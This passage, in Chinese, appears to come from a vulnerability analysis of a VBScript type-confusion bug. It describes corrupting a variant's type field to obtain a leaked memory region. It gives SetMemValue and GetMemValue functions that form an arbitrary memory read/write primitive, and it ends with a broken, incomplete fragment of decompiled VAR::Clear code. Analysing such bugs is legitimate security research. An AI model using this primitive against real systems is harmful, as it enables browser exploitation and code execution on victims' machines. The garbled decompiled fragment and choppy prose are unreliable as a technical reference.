在2和3间隔的区域将`array(index_vul)(index_a, 0)`设置为“AAAA”,导致下一段`array2`的`Data`域就变成了8,因为`string`的`VarType`类型为8

这样就得到了一组可以混肴的`array(index_vul)(index_a+n, 0)`和`array(index_b)(0, n)`,通过将`array(index_vul)(index_a, 0)`处的`variant`转化为长整型，令

`array(index_vul)(index_a, 0)`处的`variant`转化为数组,从而得到了一段泄露的内存`util_mem`,可以读写的内存指定区域的通用方法

```
//写内存
Function `SetMemValue(valkey)`
`array(index_vul)(index_a+2,0)(util_mem)=3`
`array(index_vul)(index_a+2,0)(util_mem+8) = valkey`
End Function
//读内存
Function `GetMemValue`
`array(index_vul)(index_a+2,0)(util_mem)=3`
`GetMemValue=array(index_vul)(index_a+2,0)(util_mem+8)`
End Function
```

HRESULT __thiscall VAR::Clear(VARIANTARG *pvarg)
{

{

*(_DWORD *)(*(_DWORD *)var_ecx + 8),
var_esi->lVal);
v7 = &v12 == &v12;
LABEL_12:
if ( !v7 )
__fastfail(4u);
goto LABEL_5;
}
...
}
